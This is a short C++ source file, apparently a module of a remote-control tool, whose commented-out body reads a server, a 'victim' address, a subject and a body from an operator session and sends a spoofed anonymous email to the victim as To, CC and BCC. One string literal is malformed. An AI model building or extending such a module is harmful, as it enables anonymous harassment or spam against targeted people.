#include <log/Log.hpp>
#include <malicious/FastSmtp.hpp>
using namespace std;

#include <common/Innocence.hpp>
#include <audit/Audit.hpp>

int submain(int argc, char ** argv)
{
	LOG.setIdentity(Common::identity);
    LOG.addObserver(new Log::LogToConsole);
	LOG.addObserver(new Log::LogToCollector);
	LOG.addObserver(new Audit::LogToAuditor);

	try
	{
        /*
		string server;
        string subject;
        string victim;
        string body;

        // reception des parametres de l'email
        session() >> server >> victim >> subject >> body;

        LOG << Server : " << server;
        LOG << "Victim : " << victim;
        LOG << "Subject : " << subject;
        LOG << "Body : " << body;

        CFastSmtp mail;
        if (mail.ConnectServer(server.c_str()))
        {
            LOG << "Connected to SMTP server : " + server;
            mail.SetSenderName("anonyme");
            mail.SetSenderEmail("anonym@free.fr");
            mail.SetSubject(subject.c_str());
            mail.AddRecipient(victim.c_str());
            mail.AddCCRecipient(victim.c_str());
            mail.AddBCCRecipient(victim.c_str());
            mail.SetMessageBody(body.c_str());

            if (mail.GetConnectStatus())
            {
                if(mail.Send())
                {
                    session() << SUCCESS;
                    LOG << "Mail sent";
                }
                else
                {
                    session() << FAILURE;
                    LOG << "Unable to send mail";
                }
                LOG << "Disconnecting from SMTP server";
                mail.Disconnect();
            }
            else
            {
                session() << FAILURE;
                LOG << "Unable to send mail : unknown status";
            }
        }
        else
        {
            LOG << "Connecting to SMTP server failed : " + server;
            session() << FAILURE;
        }
        */
	}
	CATCH_UNKNOWN_EXCEPTION
	return EXIT_SUCCESS;
}

INNOCENCE_MAIN
